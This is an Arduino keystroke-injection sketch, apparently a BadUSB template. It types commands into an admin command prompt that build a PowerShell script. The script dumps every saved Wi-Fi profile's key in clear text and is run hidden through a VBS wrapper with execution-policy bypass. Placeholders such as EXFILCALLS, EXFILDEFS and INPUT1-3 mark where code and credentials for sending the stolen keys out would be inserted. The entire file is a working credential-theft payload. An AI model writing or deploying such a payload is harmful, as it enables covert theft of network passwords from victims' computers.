void setup(){
   Keyboard.begin();
}
void loop(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println(F("echo $pn = $env:COMPUTERNAME + \"  WLAN-Keys\" > %temp%\\wl.ps1"));
  Keyboard.println(F("echo $user = \"INPUT1\" >> %temp%\\wl.ps1"));
  Keyboard.println(F("echo $pass = \"INPUT2\" >> %temp%\\wl.ps1"));
  Keyboard.println(F("echo $dev = \"INPUT3\" >> %temp%\\wl.ps1"));
  Keyboard.println(F("echo $w = netsh wlan show profiles ^| sls -Pattern \"All User Profile\" ^| foreach {$_.ToString()} >> %temp%\\wl.ps1"));
  Keyboard.println(F("echo $ed = $w ^| foreach {$_.Replace(\"    All User Profile     : \",$null)} >> %temp%\\wl.ps1"));
  Keyboard.println(F("echo $pv = $ed ^| foreach {netsh wlan show profiles name=\"$_\" key=clear} >> %temp%\\wl.ps1"));
  

  String fn = "wl";
  String fp;
  EXFILCALLS

  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\wl.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\wl.ps1\"),0,true >> %temp%\\wl.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\wl.vbs"));
  delay(1000);
  Keyboard.println(F("exit"));
  while(true);
}

DEFS
EXFILDEFS
